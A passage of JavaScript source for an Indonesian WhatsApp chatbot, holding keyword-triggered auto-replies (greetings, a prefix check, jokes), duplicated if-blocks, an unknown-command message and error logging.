if (js == '{}') js = { err }
js = JSON.stringify(js, null, 2)
js = '```' + js + '```'
reply('_' + err + '_\n\n' + js)
}
}
	
//fin
		if(budy.includes('Cekprefix')){
cpref = ` *Prefix Saat ini: ( ${prefix} )*`
reply(cpref)
}
 if(budy.includes('cekprefix')){
cpref = ` *Prefix Saat ini: ( ${prefix} )*`
reply(cpref)
}
if(budy.includes('Bambang')){
cpref = `Hayo Ngomongin Bambang Yaaa Aowkowkwoo`
reply(cpref)
}
if(budy.includes('Mbang')){
cpref = `Hayo Ngomongin Bambang  Yaaa Aowkowkwoo`
reply(cpref)
}
if(budy.includes('Assalamualaikum')){
cpref = `Hay Saya BTR X-BOT OFC Whatsapp Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('assalamualaikum')){
cpref = `Hay Saya BTR X-BOT OFC Whatsapp Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('Hai')){
cpref = `Hay Saya BTR X-BOT OFC Whatsapp Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('hai')){
cpref = `Hay Saya BTR X-BOT OFC Whatsapp Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('Bot')){
cpref = `iya gue emng bot ga seneng GELUD pepeq`
reply(cpref)
}
if(budy.includes('bot')){
cpref = `iya gue emng bot ga seneng GELUD pepeq`
reply(cpref)
}if(budy.includes('Cekprefix')){
cpref = ` *Prefix Saat ini: ( ${prefix} )*`
reply(cpref)
}
if(budy.includes('Bambang')){
cpref = `Hayo Ngomongin Bambang Yaaa Aowkowkwoo`
reply(cpref)
}
if(budy.includes('Mbang')){
cpref = `Hayo Ngomongin Bambang  Yaaa Aowkowkwoo`
reply(cpref)
}
if(budy.includes('Assalamualaikum')){
cpref = `Hay Saya BTR X-BOT OFC Whatsapp Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('Hai')){
cpref = `Hay Saya BTR X-BOT OFC Whatsapp Ketik .menu Untuk Mengakses`
reply(cpref)
}
if(budy.includes('Test')){
cpref = `iya gue dah on lol`
reply(cpref)
}
if(budy.includes('bot')){
cpref = `iya gue emng bot ga seneng GELUD pepeq`
reply(cpref)
}
if (!isGroup && isCmd && !mek.key.fromMe){
teks = `Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
Bambang.sendMessage(from, {text:teks, jpegThumbnail:fs.readFileSync('./media/canss.jpg')}, 'extendedTextMessage', {sendEphemeral:true, quoted:mek, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
}
	} 
if (isGroup && budy != undefined) {
} else {
console.log('[',color('TEXT','teal'),']',`Message : ${budy} From`, color(pushname))
}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	}
}



